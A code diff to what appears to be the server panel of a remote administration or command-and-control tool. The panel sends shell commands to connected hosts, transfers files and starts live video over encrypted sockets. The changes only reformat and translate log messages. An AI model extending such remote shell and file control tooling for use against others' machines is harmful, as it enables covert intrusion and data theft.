@@ -1297,7 +1297,7 @@ class Ui_MainWindow(object):
         self.s = socket(AF_INET, SOCK_STREAM)
         self.s.bind((self.HOST, self.PORT))
         self.s.listen(5)
-        print("Server is running on " + str(self.PORT))
+        print("[INFO] Server is running on " + str(self.PORT))
         self.run()
 
         self.refresh = False
@@ -1458,7 +1458,7 @@ class Ui_MainWindow(object):
                     if os_selected in str(hinfo[4]).lower():
                         result = re.search('-exec "(.*)" -os', str(str_cm))
                         content = (result.group(1)).lstrip().rstrip()
-                        print(content)
+                        print(f'[INFO] content: {content}')
 
                         with open(f'bin/request/transfer/stdin/{tag_host.replace("tag:", "")}', 'w') as set_output:
                             set_output.write(f'[SYSTEM_SHELL]{content}')
@@ -1560,7 +1560,7 @@ class Ui_MainWindow(object):
         exec(
             f'global tag_{system[2]}_send; tag_{system[2]}_send = "hello"; self.variables.append("tag_{system[2]}_send")')
 
-        print(f'\nclients -> {self.clients}')
+        print(f'\n[INFO] clients: {self.clients}')
 
         time_refresh = 0
 
@@ -1582,7 +1582,7 @@ class Ui_MainWindow(object):
                         clear_stdin.write('')
                         clear_stdin.close()
 
-                    print(f'enviando -> {data}')
+                    print(f'[INFO] Sending: {data}')
                     command_crypt = self.crypt(data, f'{server_key}')
 
                     if "%sv-init-live-video%" in data:
@@ -1666,8 +1666,8 @@ class Ui_MainWindow(object):
 
 
                         except Exception as exception:
-                            print("Exception: {}".format(type(exception).__name__))
-                            print("Exception message: {}".format(exception))
+                            print("[ERROR] Exception: {}".format(type(exception).__name__))
+                            print("[ERROR] Exception message: {}".format(exception))
 
                             try:
                                 pass
@@ -1735,9 +1735,9 @@ class Ui_MainWindow(object):
                             while True:
                                 c.settimeout(1)
                                 clear_buff = c.recv(1024*1024*5)
-                                print('buffer cleaned FGET')
+                                print('[INFO] buffer cleaned FGET')
                         except:
-                            print('except buffer fget')
+                            print('[ERROR] except buffer fget')
                             pass
 
                         command_crypt = self.crypt(f'[FGET]{client_side}', f'{server_key}')
@@ -1753,14 +1753,14 @@ class Ui_MainWindow(object):
                                     break
                             except:
                                 pass
-                            print(f'writing => {l}')
+                            print(f'[INFO] writing => {l}')
                             f.write(l)
 
                             c.settimeout(25)
                             l = c.recv(1024*1024)
 
                         f.close()
-                        print('FIM ARQUIVO\n\n\n')
+                        print('[INFO] End file\n\n\n')
 
                         with open(f'{server_side}', 'rb') as a:
                             b = a.read()
@@ -1861,8 +1861,8 @@ class Ui_MainWindow(object):
 
 
                         except Exception as exception:
-                            print("Exception: {}".format(type(exception).__name__))
-                            print("Exception message: {}".format(exception))
+                            print("[ERROR] Exception: {}".format(type(exception).__name__))
+                            print("[ERROR] Exception message: {}".format(exception))
 
                             with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                 set_output.write('Error: An error has occurred with the file.\n')
@@ -1878,8 +1878,8 @@ class Ui_MainWindow(object):
                             f = open(f'{server_side}_tmp', 'rb')
 
                         except Exception as exception:
-                            print("Exception: {}".format(type(exception).__name__))
-                            print("Exception message: {}".format(exception))
+                            print("[ERROR] Exception: {}".format(type(exception).__name__))
+                            print("[ERROR] Exception message: {}".format(exception))
 
                             with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                 set_output.write('Error: An error has occurred with the file.\n')
@@ -1906,7 +1906,7 @@ class Ui_MainWindow(object):
                                 c.settimeout(5)
                                 c.send(l)
                             except:
-                                print('except FGET')
+                                print('[ERROR] except FGET')
                                 break
                             l = f.read(1024)
                         f.close()
@@ -1931,7 +1931,7 @@ class Ui_MainWindow(object):
                         try:
                             c.settimeout(0.1)
                             clear_buff = c.recv(1024*1024*1024)
-                            print('buffer cleaned')
+                            print('[INFO] buffer cleaned')
                         except:
                             pass
 
@@ -1940,7 +1940,7 @@ class Ui_MainWindow(object):
                         #data = c.recv(1024*1024*5) #### old recv mode
                         #data = data.decode('utf-8')  #### old recv mode
 
-                        print('---------------------------------------------------------------')
+                        print('-'*63)
 
                         data_string = ''
 
@@ -1959,7 +1959,7 @@ class Ui_MainWindow(object):
                         #data = data.replace(rmvth1, '')
                         data_string += data
 
-                        print(f'FRAGMENTO > {data}')
+                        print(f'[INFO] FRAGMENTO: {data}')
 
 
                         #data = data.decode('utf-8')
@@ -1982,7 +1982,7 @@ class Ui_MainWindow(object):
                                 #data = data.replace(rmvth1, '')
                                 data_string += data
 
-                                print(f'FRAGMENTO > {data}')
+                                print(f'[INFO] FRAGMENTO: {data}')
                             except:
                                 break
 
@@ -1994,10 +1994,10 @@ class Ui_MainWindow(object):
                         data_string = data_string.replace('"', '')
                         data_string = data_string.replace("'", '')
 
-                        print(data_string)
+                        print(f'[INFO] data string: {data_string}')
                         data_string = data_string.replace('%%GBITR%%', 'b')
 
-                        print(data_string)
+                        print(f'[INFO] data string: {data_string}')
                         print('---------------------------------------------------------------')
 
                         try:
@@ -2005,7 +2005,7 @@ class Ui_MainWindow(object):
                         except:
                             decrypt_data = b'None'
 
-                        print(f'bytes -> {decrypt_data}')
+                        print(f'[INFO] Data Bytes: {decrypt_data}')
 
                         try:
                             if b"stty: \'standard input\': Inappropriate ioctl for device\\n" in decrypt_data:
@@ -2041,22 +2041,22 @@ class Ui_MainWindow(object):
 
                         data = decrypt_data.decode('utf-8')
 
-                        print(f'recebemos -> {data}')
-                        print(type(data))
+                        print(f'[INFO] We received: {data}')
+                        print(f'[INFO] Data type: {type(data)}')
 
                         ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
                         ansi_escape = ansi_escape.sub('', data)
                         data = ansi_escape
 
-                        print(f'regex {data}')
-                        print(type(data))
+                        print(f'[INFO] Regex: {data}')
+                        print(f'[INFO] Regex type: {type(data)}')
 
                         rmb = data[:2]
 
                         if rmb == 'b"' or rmb == "b'":
                             data = data.replace(rmb, '')
 
-                        print(f'escrevendo {data}')
+                        print(f'[INFO] Writing: {data}')
 
                         #data = data.encode('utf-8', 'ignore')
                         #data = str(data)
@@ -2081,7 +2081,7 @@ class Ui_MainWindow(object):
                 fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                 print(exc_type, fname, exc_tb.tb_lineno)
 
-                print(f'host {system[1]} disconnected [1]')
+                print(f'[ERROR] Disconected Host: {system[1]} disconnected [1]')
                 for e in self.clients:
                     if system[2] in e:
                         self.clients.remove(e)
@@ -2090,7 +2090,7 @@ class Ui_MainWindow(object):
                     set_execute.write('False')
                     set_execute.close()
 
-                print(f'novo clients -> {self.clients}')
+                print(f'[INFO] New client: {self.clients}')
                 break
 
 
@@ -2112,16 +2112,16 @@ class Ui_MainWindow(object):
                     time_refresh = 0
 
             except Exception as exception:
-                print("Exception: {}".format(type(exception).__name__))
+                print("[ERROR] Exception: {}".format(type(exception).__name__))
             #except (ConnectionAbortedError, AttributeError):
-                print("Exception message: {}".format(exception))
-                print(f'host {system[1]} disconnected [2]')
+                print("[ERROR] Exception message: {}".format(exception))
+                print(f'[ERROR] Disconected Host {system[1]} disconnected [2]')
 
                 for e in self.clients:
                     if system[2] in e:
                         self.clients.remove(e)
 
-                print(f'new client -> {self.clients}')
+                print(f'[INFO] New client: {self.clients}')
                 break
 
             time.sleep(3)
@@ -2147,7 +2147,7 @@ class Ui_MainWindow(object):
         #thread_strms.start()
         #start_stream()
         dir_path = os.path.dirname(os.path.realpath(__file__))
-        print(dir_path)
+        print(f'[INFO] DIR path: {dir_path}')
 
         if 'linux' in str(platform.platform()).lower():
             try:
@@ -2193,7 +2193,7 @@ class Ui_MainWindow(object):
             str_content = str(str_content).replace("b'", "").replace("'", "")
             system_info = str_content
 
-            print(system_info)
+            print(f'[INFO] System info: {system_info}')
 
             charact1 = system_info[-1:]
             charact2 = system_info[:1]
@@ -2668,3 +2668,4 @@ class host_painel(QMainWindow):
 def void(selected):
     init_m = Ui_MainWindow()
     init_m.painel_init(selected)
+
